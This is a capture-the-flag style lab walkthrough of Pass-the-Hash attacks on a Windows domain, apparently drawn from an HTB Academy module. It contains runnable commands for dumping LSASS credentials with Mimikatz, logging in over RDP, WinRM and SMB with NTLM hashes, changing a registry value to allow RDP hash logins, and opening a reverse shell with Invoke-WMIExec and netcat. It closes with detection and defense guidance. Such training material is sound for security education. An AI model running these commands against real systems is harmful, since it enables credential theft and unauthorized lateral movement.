# 🛰️ Pass The Hash (PtH) Guide

---

## 💡 Introduction to PtH

Pass-the-Hash (PtH) is a method that leverages stored NTLM hashes for unauthorized access without needing plaintext credentials. This guide covers techniques using Windows and Linux tools, including the use of Mimikatz, Impacket, Evil-WinRM, xfreerdp, and more.

---

## 📊 Lab Environment Setup

- **IPs**:
  - DC01: `192.168.113.137`
  - MS01: `192.168.113.143`

### Required Tools and Dependencies
```bash
# Windows tools
- Mimikatz
- xfreerdp
- Evil-WinRM (PowerShell module)
- WinRM service

# Linux binaries
- impacket
```
---

## 🔍 Exercises

### Exercise 1: RDP PtH with Mimikatz PTH Files

**Objective**: Use NTLM hashes stored in `pth.txt` to access DC01 via RDP.

```cmd
# Method 1: Using xfreerdp
xfreerdp /u:Administrator /pth:C:\pth.txt /v:DC01

# Method 2: Manual hash input with xfreerdp
xfreerdp /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /v:DC01

# Method 3: Using Evil-WinRM
evil-winrm -i TARGET_IP -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
Get-Content C:\pth.txt
```

### Exercise 2: RDP Registry Configuration

**Objective**: Identify and configure registry value for RDP PtH.

```cmd
# Answer: DisableRestrictedAdmin
# Location: HKLM\System\CurrentControlSet\Control\Lsa
# Value: 0 (DWORD)

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Connect via RDP with hash
xfreerdp /v:TARGET_IP /u:Administrator /pth:30B3783CE2ABF1AF70F7D0660CF3453
```

### Exercise 3: Hash Extraction with Mimikatz

**Objective**: Extract David's NTLM hash from current session.

```cmd
# Connect via RDP with Administrator
# Navigate to C:\tools and run Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# Look for David's account NTLM hash
```

### Exercise 4: Share Access with David's Hash

**Objective**: Use David's hash to access `\\DC01\david` share.

```cmd
# Method 1: Using Mimikatz PtH
mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:DAVID_HASH /domain:inlanefreight.htb /run:cmd.exe" exit
net use \\DC01\david

# Method 2: From Linux using Impacket  
impacket-smbclient inlanefreight.htb/david@DC01 -hashes :DAVID_HASH
shares
use david
ls
get david.txt
```

### Exercise 5: Julio Share Access

**Objective**: Use Julio's hash to access `\\DC01\julio` share.

```cmd
# Extract Julio's hash from Mimikatz output
# Use hash: 64F12CDDAA88057E06A81B54E73B949B

net use \\DC01\julio /user:julio /password:* 
type \\DC01\julio\julio.txt
```

### Exercise 6: Reverse Shell with Invoke-TheHash

**Objective**: Create reverse shell from DC01 to MS01 using Julio's hash.

```powershell
# Step 1: Start Netcat listener on MS01
C:\tools\nc.exe -lvnp 8001

# Step 2: Import Invoke-TheHash
Import-Module C:\tools\Invoke-TheHash\Invoke-TheHash.psd1

# Step 3: Generate reverse shell command (revshells.com)
# PowerShell #3 (Base64) targeting MS01 IP

# Step 4: Execute reverse shell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "BASE64_ENCODED_POWERSHELL_COMMAND"

# Step 5: Access flag file
Get-Content C:\julio\flag.txt
```

### Optional Exercise: Remote Management Users

**Objective**: Test john's account with Remote Management Users membership.

```bash
# Test with Impacket (should fail - wrong protocol)
impacket-psexec inlanefreight.htb/john@MS01 -hashes :JOHN_HASH

# Result: Access denied (SMB not allowed)

# Test with Evil-WinRM (should succeed)
evil-winrm -i MS01 -u john@inlanefreight.htb -H JOHN_HASH
# Result: Successful PowerShell session (WinRM allowed)
```

---

## 🛡️ Detection and Defense

### Detection Indicators

```bash
# Network-based detection
- Multiple NTLM authentication attempts
- Unusual source IPs for administrative accounts
- Cross-subnet administrative activity
- Service creation/deletion patterns

# Host-based detection
- Abnormal process spawning patterns
- Registry modifications (DisableRestrictedAdmin)
- Unusual PowerShell execution
- Administrative tool usage from non-admin systems
```

### Defense Recommendations

```bash
# Authentication hardening
✅ Implement LAPS for local administrator passwords
✅ Disable NTLM where possible (use Kerberos)
✅ Enable Protected Process Light for LSASS
✅ Regular password rotation policies

# Network segmentation
✅ Limit administrative account network access
✅ Implement privileged access workstations (PAWs)
✅ Network access control (802.1X)
✅ Micro-segmentation for critical assets

# Monitoring and logging
✅ Monitor event ID 4624 (successful logons)
✅ Track service creation (event ID 7045)
✅ PowerShell script block logging
✅ Sysmon for detailed process monitoring
```

---

## 📋 Pass the Hash Methodology

### Pre-Attack Requirements

```bash
# Hash acquisition methods
1. Local SAM database dumping
2. NTDS.dit extraction from Domain Controller
3. LSASS memory dumping
4. Network traffic interception
5. Credential dumping with Mimikatz/secretsdump
```

### Attack Decision Matrix

```bash
# Windows environment (internal access)
✅ Mimikatz sekurlsa::pth - Direct hash injection
✅ Invoke-TheHash - PowerShell framework
✅ Built-in Windows tools integration

# Linux environment (remote access)
✅ Impacket suite - Multiple execution methods
✅ NetExec - Network-wide hash spraying
✅ Evil-WinRM - PowerShell remoting

# GUI access required
✅ xfreerdp with /pth - RDP with hash
✅ Requires DisableRestrictedAdmin = 0
```

### Execution Method Selection

```bash
# SMB execution (psexec, smbexec)
- Service creation and management
- Requires ADMIN$ share access
- Firewall-friendly (port 445)

# WMI execution (wmiexec)  
- Windows Management Instrumentation
- Requires DCOM permissions
- Stealthier than SMB methods

# PowerShell remoting (Evil-WinRM)
- Requires WinRM service enabled
- Remote Management Users membership
- Interactive PowerShell session

# RDP access (xfreerdp)
- Full GUI desktop access
- Requires Restricted Admin Mode
- Registry modification needed
```

---

## 💡 Key Takeaways

1. **NTLM weakness** - Hash reuse without salt makes PtH possible.
2. **Multi-platform attacks** - Both Windows and Linux tools available.
3. **UAC limitations** - Local accounts restricted, domain accounts privileged.
4. **Registry dependencies** - RDP PtH requires DisableRestrictedAdmin modification.
5. **Protocol diversity** - SMB, WMI, WinRM, RDP all support hash authentication.
6. **Network impact** - Single hash can compromise multiple systems.
7. **Detection challenges** - Legitimate authentication protocols exploited.
8. **Defense strategy** - LAPS, Kerberos, and network segmentation critical.

---

*This comprehensive guide covers Pass the Hash attack techniques using Windows and Linux tools, based on HTB Academy's Password Attacks module.*